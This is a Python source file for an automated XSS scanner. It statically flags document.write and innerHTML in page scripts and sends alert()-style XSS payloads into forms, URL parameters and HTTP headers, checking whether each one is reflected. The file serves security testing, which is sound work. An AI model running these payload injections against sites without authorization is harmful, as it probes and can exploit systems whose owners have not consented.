import logging
import json
import re
import itertools
import asyncio
import aiohttp
from bs4 import BeautifulSoup

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Static Analysis Functions
def find_vulnerable_scripts(html):
    soup = BeautifulSoup(html, 'html.parser')
    scripts = soup.find_all('script')
    vulnerabilities = []

    for script in scripts:
        script_content = script.string
        if script_content:
            # Поиск потенциальных уязвимостей в JS-коде
            if re.search(r'document\.write', script_content) or re.search(r'innerHTML', script_content):
                vulnerabilities.append({
                    'type': 'Static Analysis',
                    'description': 'Potentially vulnerable JavaScript function found',
                    'details': script_content.strip()
                })
    return vulnerabilities

# Dynamic Analysis Functions
async def send_request(session, url, method, data=None, headers=None, cookies=None):
    try:
        if method == 'GET':
            async with session.get(url, headers=headers, cookies=cookies) as response:
                return await response.text()
        elif method == 'POST':
            async with session.post(url, data=data, headers=headers, cookies=cookies) as response:
                return await response.text()
    except Exception as e:
        logger.error(f"Request error: {e}")
        return None

async def test_xss_injection(session, url, param, payload, method, headers=None, cookies=None):
    data = {param: payload}
    response_text = await send_request(session, url, method, data=data, headers=headers, cookies=cookies)
    if response_text:
        return payload in response_text
    return False

def generate_heuristic_payloads():
    base_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"]
    attributes = ["src", "href", "onload", "onerror", "onclick"]
    events = ["onload", "onerror", "onclick", "onmouseover", "onfocus"]

    heuristic_payloads = base_payloads.copy()
    for attribute, event in itertools.product(attributes, events):
        heuristic_payloads.append(f"<img {attribute}=x {event}=alert('XSS')>")
        heuristic_payloads.append(f"<a {attribute}=x {event}=alert('XSS')>Click me</a>")
    return heuristic_payloads

async def analyze_xss(scraped_data):
    vulnerabilities = []
    logger.info(f"Analyzing XSS vulnerabilities for scraped data: {scraped_data}")
    xss_payloads = {
        "basic": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
        "advanced": [
            "<svg/onload=alert('XSS')>",
            "<details/open ontoggle=alert('XSS')>",
            "<a href='javascript:alert(\"XSS\")'>Click me</a>"
        ],
        "dom_based": ["<script>document.body.innerHTML='XSS'</script>"],
        "heuristic": generate_heuristic_payloads()[:5]  # Ограничиваем количество эвристических полезных нагрузок
    }

    async with aiohttp.ClientSession() as session:
        tasks = []

        for page in scraped_data:
            url = page['URL']
            forms = page.get('Forms', [])
            html_content = page.get('HTML Content', '')

            # Static Analysis
            static_vulnerabilities = find_vulnerable_scripts(html_content)
            if static_vulnerabilities:
                vulnerabilities.extend(static_vulnerabilities)

            # Dynamic Analysis - Forms
            for form in forms:
                action = form['action'] if form['action'] else url
                method = form['method']
                inputs = form['inputs']
                for input_field in inputs:
                    name = input_field['name']
                    if not name:
                        continue

                    for payload_type, payload_list in xss_payloads.items():
                        for payload in payload_list:
                            tasks.append(
                                test_xss_injection(session, action, name, payload, method)
                            )

            # Dynamic Analysis - URL Parameters
            url_params = page.get('Parameters', {})
            for param, value in url_params.items():
                for payload_type, payload_list in xss_payloads.items():
                    for payload in payload_list:
                        new_params = url_params.copy()
                        new_params[param] = payload
                        new_url = url + "?" + "&".join([f"{k}={v}" for k, v in new_params.items()])
                        tasks.append(
                            test_xss_injection(session, new_url, param, payload, 'GET')
                        )

            # Dynamic Analysis - HTTP Headers
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
            for header in ['User-Agent', 'Referer', 'Cookie']:
                for payload_type, payload_list in xss_payloads.items():
                    for payload in payload_list:
                        new_headers = headers.copy()
                        new_headers[header] = payload
                        tasks.append(
                            test_xss_injection(session, url, header, payload, 'GET', new_headers)
                        )

        results = await asyncio.gather(*tasks)
        for result in results:
            if result:
                vulnerabilities.append(result)

    logger.info(f"XSS vulnerabilities found: {vulnerabilities}")
    return vulnerabilities

def load_scraped_data(file_path):
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        logger.info(f"Scraped data loaded from {file_path}")
        return data
    except Exception as e:
        logger.error(f"Error loading scraped data from {file_path}: {e}")
        return []

if __name__ == '__main__':
    scraped_data = load_scraped_data('scraped_data.json')
    vulnerabilities = asyncio.run(analyze_xss(scraped_data))
    with open('xss_vulnerabilities.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=4)
